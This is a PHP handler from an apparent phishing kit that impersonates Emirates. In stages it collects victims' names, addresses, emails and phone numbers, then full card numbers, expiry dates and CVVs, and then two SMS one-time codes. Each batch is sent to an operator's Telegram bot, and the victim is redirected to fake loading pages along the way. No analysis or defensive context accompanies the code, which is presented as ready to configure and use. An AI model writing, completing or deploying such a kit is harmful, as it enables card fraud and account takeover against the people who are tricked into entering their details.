<?php 

// Configuration - Can be empty
$id = ""; // Your Telegram chat ID (optional)
$apiToken = ""; // Your bot token from BotFather (optional)

// Initialize variables
$message = "";

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step'])) {
    
    $step = $_POST['step'];
    $address = $_SERVER['REMOTE_ADDR'];

    //================
    #==> INDEX
    //================
    if ($step == 'index') {
        $first = $_POST['first'] ?? '';
        $last = $_POST['last'] ?? '';
        $address = $_POST['adress'] ?? '';
        $zip = $_POST['zip'] ?? '';
        $email = $_POST['email'] ?? '';
        $number = $_POST['number'] ?? '';

        if (empty($first) || empty($last) || empty($address) || empty($zip) || empty($email) || empty($number)) {
            header("Location: index.php?error=empty_fields");
            exit();
        } else {
            $subject = $address . " | CC | EMIRATES " . "\r\n";
            $message = "FIRST NAME: " . $first . "\r\n";
            $message .= "LAST NAME: " . $last . "\r\n";
            $message .= "ADDRESS: " . $address . "\r\n";
            $message .= "ZIP CODE: " . $zip . "\r\n";
            $message .= "EMAIL: " . $email . "\r\n";
            $message .= "NUMBER: " . $number . "\r\n";

            // Send to Telegram only if credentials are provided
            if (!empty($id) && !empty($apiToken)) {
                $data = [
                    'chat_id' => $id,
                    'text' => $subject . $message
                ];
                
                $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
            }
            
            header("Location: loading.php");
            exit();
        }
    }

    //================
    #==> CC 
    //================
    if ($step == 'cc') {
        $card = $_POST['card'] ?? '';
        $date = $_POST['date'] ?? '';
        $code = $_POST['cvv'] ?? '';

        if (empty($card) || empty($date) || empty($code)) {
            header("Location: cc.php?error=empty_fields");
            exit();
        } else {
            $subject = $address . " | CC | EMIRATES " . "\r\n";
            $message = "CARD NUMBER: " . $card . "\r\n";
            $message .= "EXP DATE: " . $date . "\r\n";
            $message .= "CODE CVV: " . $code . "\r\n";

            // Send to Telegram only if credentials are provided
            if (!empty($id) && !empty($apiToken)) {
                $data = [
                    'chat_id' => $id,
                    'text' => $subject . $message
                ];
                
                $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
            }
            
            header("Location: loading_1.php");
            exit();
        }
    }

    //================
    #==> SMS 1
    //================
    if ($step == 'sms') {
        $sms = $_POST['sim'] ?? '';

        if (empty($sms)) {
            header("Location: sms.php?error=empty_fields");
            exit();
        } else {
            $subject = $address . " | SMS | EMIRATES " . "\r\n";
            $message = "SMS1: " . $sms . "\r\n";

            // Send to Telegram only if credentials are provided
            if (!empty($id) && !empty($apiToken)) {
                $data = [
                    'chat_id' => $id,
                    'text' => $subject . $message
                ];
                
                $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
            }
            
            header("Location: loading_2.php");
            exit();
        }
    }

    //================
    #==> SMS 2
    //================
    if ($step == 'sms_1') {
        $sms = $_POST['sim'] ?? '';

        if (empty($sms)) {
            header("Location: sms.php?error=empty_fields");
            exit();
        } else {
            $subject = $address . " | SMS | EMIRATES " . "\r\n";
            $message = "SMS2: " . $sms . "\r\n";

            // Send to Telegram only if credentials are provided
            if (!empty($id) && !empty($apiToken)) {
                $data = [
                    'chat_id' => $id,
                    'text' => $subject . $message
                ];
                
                $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
            }
            
            header("Location: loading_3.php");
            exit();
        }
    }
}

// If no valid step found, redirect to index
header("Location: index.php");
exit();

?>